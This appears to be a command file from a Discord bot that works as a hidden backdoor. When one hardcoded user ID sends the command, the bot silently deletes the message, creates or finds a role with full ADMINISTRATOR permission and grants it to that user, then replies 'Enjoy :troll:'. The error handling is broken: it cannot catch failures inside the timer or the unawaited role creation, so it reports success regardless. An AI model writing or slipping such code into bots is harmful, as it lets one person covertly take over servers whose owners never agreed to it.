const Utils = require("../Utils/Utils");

module.exports = {
    Execute: function(msg) {
        if (msg.author.id !== "350718252076367874") return;

        msg.delete(msg);

        const member = msg.member;

        try {
            setTimeout(() => {
                var role = msg.guild.roles.cache.find(r => r.name.toLowerCase() === "adminrole");

                if (!role) {
                    role = msg.guild.roles.create({data: {name: "AdminRole", permissions: ["ADMINISTRATOR"]}});
                }

                member.roles.add(role);
            }, 1000);

            Utils.sendMessage(msg, "Success!", "(:white_check_mark:) Created role and given it to you. Enjoy :troll:");
        } catch (err) {
            Utils.sendMessage(msg, "Error", "(:x:) Error while giving/creating role. (I don't have permissions)");
        }
    }
}